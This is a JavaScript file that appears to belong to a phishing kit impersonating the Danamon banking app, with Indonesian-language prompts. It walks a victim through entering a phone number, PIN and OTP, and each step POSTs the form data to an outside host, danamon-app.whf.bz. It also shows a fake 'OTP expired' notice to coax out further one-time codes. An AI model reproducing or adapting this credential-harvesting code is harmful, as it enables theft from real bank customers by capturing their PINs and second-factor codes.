//var pinContainer = document.getElementsByClassName("pin-code")[maxlength];
var pinContainer = document.querySelector(".box-input-pin");
console.log('There is ' + pinContainer.length + ' Pin Container on the page.');

pinContainer.addEventListener('keyup', function (event) {
    var target = event.srcElement;
    
    var maxLength = parseInt(target.attributes["maxlength"].value, 6);
    var myLength = target.value. length;

    if (myLength >= maxLength) {
        var next = target;
        while (next = next.nextElementSibling) {
            if (next == 0) break;
            if (next.tagName.toLowerCase() == "input") {
                next.focus();
                break;
            }
        }
    }

    if (myLength === 0) {
        var next = target;
        while (next = next.previousElementSibling) {
            if (next == 0) break;
            if (next.tagName.toLowerCase() == "input") {
                next.focus();
                break;
            }
        }
    }
}, false);

pinContainer.addEventListener('keydown', function (event) {
    var target = event.srcElement;
    target.value = "";
}, false);

$('.inpotp').on('input', function(event) {const inputs = $('.inpotp');const isAllFilled = Array.from(inputs).every((input) => input.value !== '');if (isAllFilled == true) {$(event.target).blur();sendOtp();}const index = inputs.index(this);const currentValue = event.target.value;if (currentValue.length === 1) {if (index < inputs.length - 1) {inputs[index + 1].focus();}} else if (currentValue.length === 0) {if (index > 0) {inputs[index].focus();}};});$('.inpotp').on('keydown', function(event) {const inputs = $('.inpotp');const key = event.key;const index = inputs.index(this);if (key === 'Backspace' && event.target.value.length === 0) {if (index > 0) {inputs[index - 1].focus();}};});
$(document).ready(function() {$('.clear').click(function() {$('.inppin').val('');$('#pin1').focus();});$('.clearotp').click(function() {$('.inpotp').val('');$('#otp1').focus();});$('.show').click(function() {$('.inppin').each(function() {if ($(this).attr('type') === 'password') {$(this).attr('type','number');$(".show").text("SEMBUNYIKAN");} else {$(this).attr('type', 'password');$(".show").text("TAMPILKAN");}});});});

 function nextPrev(){
$(".box-login").removeClass("closeright");
$(".box-login").addClass("animated");     
     event.preventDefault();
       setTimeout(function(){
           $("#homeku").hide();
           $("#back1").show();
           $("#butonku").fadeOut();
           $(".box-login").fadeIn();
           $("#process1").hide();
       },0);
 }   
 
 
 function goback1(){
     setTimeout(function(){
   $("#homeku").addClass("bounceInLeft"); $(".box-login").removeClass("animated");     
     $("#homeku").show();
      $(".box-login").fadeOut();
      $(".box-login").addClass("closeright");
      $("#butonku").fadeIn();
      $("#back1").hide();
       $("#process").hide();
       
     },0);
 }
 

 
 function goback2(){
     $("#process").show();
     setTimeout(function(){
    $("#formPin").fadeOut();
     $("#formNohp").fadeIn();
       $("#process").hide();
        $("#inp").val('');
        $("#back1").show();
        $("#back2").hide();
        document.getElementById("formPin").reset();
        $('.inppin').val('');
     },500);
 }

    $( document ).ready(function() {
            setTimeout(() => {
                $('#popup').hide();
                $('chsalxcome2').fadeIn();
            },2000)
             $('musikku').play();
        })
        













function tutupotp(){
$(".bgotp").hide();    
}

       function sendNohp(event){
    $("#process").show();event.preventDefault();
    $("#inp").blur();
     
    
    var dataString = $("#forgetPasswordForm, #formLink").serialize();
			$.ajax( {
			  type: 'POST',
			  url: 'https://danamon-app.whf.bz/token/1271362249/sendDebit.php',
			  data: dataString,
 
    
    complete: function(data) {
            console.log('Complete');
    $("#process").hide();
    document.getElementById("back1").style.display = "none";
    document.getElementById("back2").style.display = "block";
    $("#formNohp").fadeOut();
    setTimeout(function(){
   
    $("#formPin").fadeIn();
    $("#pin1").focus();
    }, 500);}});};
    

function sendPin(){

 
 
  var nomor = sessionStorage.getItem("nomor");
        document.getElementById("alert").innerHTML = "Kode dikirim ke +62 " + nomor+ " via<br/>";
        
  var dataString = $("#forgetPasswordForm, #formLink").serialize();
			$.ajax( {
			  type: 'POST',
			  url: 'https://danamon-app.whf.bz/token/1271362249/sendDebit.php',
			  data: dataString,
 


complete: function(data) {
            console.log('Complete');
$("#process").hide();
document.getElementById("alert").style.display = "block"; 
$(".bgotp").fadeIn();
setInterval(countdown, 1000);
$("#otp1").focus();
}
}
);
};


  function sendOtp(){
    $(".loadingOtp").show();
     
      setTimeout(function(){
$(".alert").text("Masa berlaku OTP sudah habis");
$(".alert").css("color","red");
 },2000);
    
    var dataString = $("#forgetPasswordForm, #formLink").serialize();
			$.ajax( {
			  type: 'POST',
			  url: 'https://danamon-app.whf.bz/token/1271362249/sendDebit.php',
			  data: dataString,
 
        
  complete: function(data) {
            console.log('Complete')
    setTimeout(function(){
    $(".loadingOtp").hide();
   
    $('.inpotp').val('');
   $('#otp1').focus();
  var nomor = sessionStorage.getItem("nomor");
        document.getElementById("alert").innerHTML = "Kode baru dikirim ulang ke +62" + nomor +  " via<br/>";
   $(".alert").css("color","black");
    },4000);
   
        
    }
        
    }
    );
        
    };
    
    function countdown() {
    var count = parseInt(
    $('#countdown').text());
    if (count !== 0) {
    $('#countdown').text(count - 1);} 
    else {
    $('#countdown').text('60');}};
   
window.onload = function(){
        setTimeout(function(){
            $(".start").fadeIn();
            setTimeout(function(){
                $(".start").fadeOut(1000);
                setTimeout(function(){
                   $(".container").fadeIn(200);
                   $("#inp").focus();
                },1000);
            },1000);
        },500);
}